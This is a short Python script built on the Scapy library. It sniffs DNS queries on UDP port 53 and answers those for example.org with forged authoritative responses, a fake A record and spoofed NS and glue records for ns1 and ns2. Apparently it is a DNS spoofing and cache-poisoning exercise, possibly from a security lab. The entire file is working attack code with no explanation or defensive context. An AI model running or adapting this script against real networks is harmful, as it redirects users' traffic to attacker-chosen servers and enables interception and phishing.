from scapy.all import *

def spoof_dns(pkt):
    if DNS in pkt and b'example.org' in pkt[DNS].qd.qname:
        # Change IP
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Change port
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # Answer section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='192.168.144.196')
        # Authority section
        NSsec1 = DNSRR(rrname='example.org', type='NS', ttl=259200, rdata='ns1.example.org')
        NSsec2 = DNSRR(rrname='example.org', type='NS', ttl=259200, rdata='ns2.example.org')
        # Additional section
        Addsec1 = DNSRR(rrname='ns1.example.org', type='A', ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns2.example.org', type='A', ttl=259200, rdata='5.6.7.8')
        # DNS packet
        DNSpkt = DNS(
            id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
            qdcount=1, ancount=1, nscount=2, arcount=2,
            an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2
        )
        # Spoof packet
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns()
sniff(filter="udp and dst port 53", prn=spoof_dns)